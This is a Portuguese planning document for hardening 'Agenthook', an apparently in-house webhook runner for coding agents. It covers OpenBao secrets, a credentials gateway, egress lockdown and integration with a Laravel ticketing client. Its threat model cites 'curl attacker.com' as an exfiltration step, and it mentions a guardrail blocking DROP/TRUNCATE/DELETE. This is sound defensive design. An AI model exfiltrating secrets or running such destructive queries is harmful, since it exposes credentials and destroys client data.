# Agenthook como produto — Plano de ação

> Documento de planejamento. Autossuficiente: assume zero contexto de conversas
> anteriores. Companheiro: [`security-and-secrets.md`](./security-and-secrets.md)
> (modelo de ameaça + decisão Infisical). Última revisão: 2026-07-15.

## 1. Contexto e decisão de base

**O que estamos construindo:** um Agenthook por projeto — um task runner que recebe
webhooks (tickets de suporte, itens de kanban) do sistema cliente, roda um agente de
código no container isolado do projeto, e responde/analisa/age. Um por projeto porque
o Daniel trabalha multi-projeto.

**Decisão de base (tomada em 2026-07-15):** construir **sobre este repo Agenthook**.
Foram avaliados três repos:

- **`agenthook`** (este) — Python/FastAPI/Typer, já maduro. Cobre ~90% dos requisitos:
  instâncias por repo, cofre de segredos Fernet, guardrail anti-injection/anti-leak,
  sessões por `thread_key`, request_type templates `ticket`/`kanban`, Management API
  `/admin/*` + painel React, MCP, verify loop, human-in-the-loop. **É a base.**
- **`nanoclaw-v2`** (`/home/daniel/dev/labs/nanoclaw-v2`) — Node/TS + Bun, chat-first
  (assistente multi-canal). **Não é a base**, mas doamos duas ideias dele (ver §3).
- **`dbmv/workspace`** (`/home/daniel/dev/dbmv/workspace`) — Laravel 12 + React,
  multi-tenant/multi-marca. É o **cliente**: o app `projector` (kanban/tickets/work
  items, banco `platform_projector`) fará POST nos webhooks e receberá callbacks.

**Duas ideias portadas do NanoClaw** (não o código, o conceito):
1. **Gateway de credenciais** — segredo HTTP nunca entra no container; um proxy
   host-side injeta a chave por request. (No NanoClaw: OneCLI gateway,
   `src/modules/approvals/onecli-approvals.ts` + skill `onecli-gateway`.)
2. **Egress lockdown** — controle de saída de rede do container do job.
   (No NanoClaw: branch upstream `feat/egress-lockdown`.)

## 2. Onde o Agenthook já atende (mapa requisito → feature)

| Requisito | Já existe no Agenthook | Referência |
|---|---|---|
| 1+ webhooks por projeto | instância por repo, `POST /hook/<instance>` | DESIGN.md §10 |
| Cofre de segredos por projeto | Fernet imutável, `env.enc`, backend plugável | `secrets.py`, DESIGN §7/§27 |
| GitHub PAT (clone/PR/commit) | `GH_TOKEN` cifrado, deliverables `commit`/`pr` | DESIGN §5 |
| Credenciais de banco | env cifradas + guardrail bloqueia DROP/TRUNCATE/DELETE sem WHERE + `force_read_only` | `runner.py` (~L372), `instances.py` |
| API keys + endpoints | env cifradas + MCP + chat REPL (`agenthook enter`) | DESIGN §25 |
| Whitelist de eventos | auth combinável: `bearer`+`header`+`hmac`+`ip-allow`+rate-limit+Idempotency-Key | DESIGN §12, `auth.py` |
| CLAUDE.md por projeto | `context set` → renderiza CLAUDE.md/AGENTS.md/GEMINI.md | DESIGN §13 |
| Skills/nome/texto/arquivos | guardrails/skills por instância, templates `ticket`/`kanban`, anexos base64+URL | DESIGN §14/§30 |
| Sessão por ticket/card | sessões por `thread_key` | DESIGN §29 |

**Conclusão:** não há rebuild. O trabalho é **hardening de segredo/egress + integração**,
não reconstrução.

## 3. Plano A — Agenthook (o motor)

Ordem prioriza **fechar segredo/exfiltração antes de ligar produção**. Cada fase é
independente e testável.

### Fase 0 — Fundação de segredos (OpenBao)

> **Decisão tomada em 2026-07-15:** **OpenBao** (fork MPL 2.0 do Vault, mantido pela
> Linux Foundation) como store único. Um só sistema cobre store cifrado + machine
> identity por projeto + dynamic DB secrets grátis — colapsa as duas decisões pendentes
> do §6 numa só e dispensa o broker de banco próprio. Ver `security-and-secrets.md` §3.

O Agenthook já tem `SecretsBackend` plugável (`plugins.py`, entry point
`agenthook.secrets_backends`; protocolo em `secrets.py`). O OpenBao entra como **novo
backend**, sem tocar no core.

- Subir **OpenBao self-hosted** (docker-compose/Helm) na infra. Definir estratégia de
  unseal (auto-unseal via KMS/transit, ou manual no começo) e backup do storage.
- **Modelagem de isolamento:** 1 *namespace* por projeto Agenthook (namespaces são
  open-source no OpenBao — no Vault seriam Enterprise); dentro dele, paths
  `prod`/`staging`; **1 AppRole por instância**, com política HCL de acesso só ao seu
  namespace → projeto A nunca lê segredo do projeto B (no nível do store, não só do prompt).
- Escrever `OpenBaoBackend(SecretsBackend)` → `get/set/items/delete` via AppRole
  (`role_id`/`secret_id`). Instância declara `secrets_backend: openbao` no YAML.
- **Credencial da AppRole mora no host**, fora do container. O container só recebe o env
  já resolvido — nunca o `secret_id`. Alinha com a exclusão `AGENTHOOK_*` control-plane
  que `runner.py` já faz.
- **Efemeridade de banco nativa** — o *database secrets engine* do OpenBao gera credencial
  Postgres/MySQL por lease com TTL de minutos e revoga automática. Sem broker próprio a
  construir (ver `security-and-secrets.md` §4).

### Fase 1 — Gateway de credenciais (portado do NanoClaw)

Complementa o Infisical: o Infisical *guarda*; o gateway garante que a chave **nunca
materializa no env do container**.

- Credenciais **HTTP-frontáveis** (API do Projector, APIs de terceiros): proxy host-side
  injeta a chave por request. Container chama `http://gateway/...`, nunca vê a key.
- **git/GitHub:** usar **GitHub App installation token** de vida curta (~1h) mintado por
  job, em vez de PAT estático. Fallback: fine-grained PAT escopado a um repo.

### Fase 2 — Egress lockdown (portado do NanoClaw)

Lacuna confirmada: hoje o container do job **não tem controle de saída** (só há IP
allowlist de *entrada* no webhook, `auth.py`).

- Rodar o container com rede restrita: allowlist só para API do Projector, github.com,
  host do banco, API do modelo e o gateway. Resto bloqueado.
- Implementação: rede docker dedicada sem internet geral + proxy egress allowlist (ou
  iptables no container). Portar a abordagem de `feat/egress-lockdown`.
- **Por quê:** exfiltração é o desfecho de toda injection. Sem egress lock, segredo
  vazado + `curl attacker.com` = fim de jogo, mesmo com Infisical.

### Fase 3 — Least-privilege por instância (usa o que já existe)

- Default `deliverable=analysis` (read-only forçado) + `mode=plan`. Escrita/PR/DB-write
  só em instâncias explicitamente marcadas **e** com aprovação humana (plan→apply já
  existe, DESIGN §19).
- Banco: role **read-only como default**; write role separado só onde necessário.
- Reforçar o guardrail com **separação estrutural do payload** — dados do ticket num
  bloco delimitado, nunca mesclados às instruções.

### Fase 4 — Consolidação de brand/repos

- Agenthook já rebrandado (MIT, é seu). Manter `nanoclaw-v2` só como referência para
  portar gateway + egress; não é base.

## 4. Plano B — Projector (dbmv/workspace) integra ao Agenthook

Módulo no backend Laravel (`api/`), app `projector`, banco `platform_projector`. O
Projector é o **cliente** que dispara webhooks e recebe callbacks.

1. **Config por org/projeto:** URL do webhook do Agenthook + segredo HMAC — guardados no
   secrets do Laravel/Infisical, nunca em código.
2. **Emissor de eventos:** ao disparar (novo comentário, mudança de status, comando
   `@agent ...` num ticket/card), montar payload estruturado:
   - `request_type: ticket|kanban`, **`thread_key`** = id do ticket/card (mantém sessão
     entre POSTs), `subject_ref`, `requester`, `language`, `priority`, anexos, `prompt`
     opcional.
   - Assinar `X-Agenthook-Signature: sha256=hmac(body,secret)` + `Idempotency-Key`.
3. **Receiver de callback:** endpoint no `api/` que recebe o resultado (Agenthook
   responde `202` + callback async), valida HMAC+seq, e posta de volta como comentário no
   ticket / atualização no card. **Idempotente** (at-least-once).
4. **Token de serviço escopado:** a API que o Agenthook chama (via gateway) usa token que
   só lê/escreve o necessário nos tickets — nunca token admin.
5. **Aprovação humana na UI:** expor o plano (plan→apply) dentro do Projector para o
   operador aprovar — reusa as URLs assinadas do Agenthook.

**Pontos de atenção transversais:**
- **Produção:** banco sempre começa read-only + staging. Escrita em prod é o maior risco.
- **Multi-tenant/multi-marca:** `thread_key` e roteamento de instância precisam carregar
  `org`/`brand` para não cruzar dados entre tenants.
- **Auditoria ponta-a-ponta:** correlacionar `job_id` (Agenthook) ↔ ticket/card (Projector).
- **"Conectado ao workspace":** duas leituras coexistem — (a) Projector chama Agenthook
  por webhook; (b) uma instância Agenthook aponta para o próprio repo `dbmv/workspace`
  para tarefas de código.

## 5. Sequência recomendada

**Fase 0 → 1 → 2** (Plano A) antes de qualquer POST de produção. Só então **Plano B**,
ligando primeiro em `staging` com `deliverable=analysis`.

## 6. Decisões pendentes

- [x] ~~Tier Infisical~~ / ~~Efemeridade de banco: broker vs Vault ao lado~~ →
  **Resolvido (2026-07-15): OpenBao único.** Store + machine identity + dynamic DB secrets
  num só sistema, MPL 2.0, sem cap de identities. Ver `security-and-secrets.md` §3/§4.
- [ ] GitHub App vs fine-grained PAT para o fluxo de PR.
- [ ] Topologia de rede do egress lock (proxy allowlist vs iptables).
- [ ] Estratégia de unseal do OpenBao (auto-unseal via KMS/transit vs manual) e backup do storage.
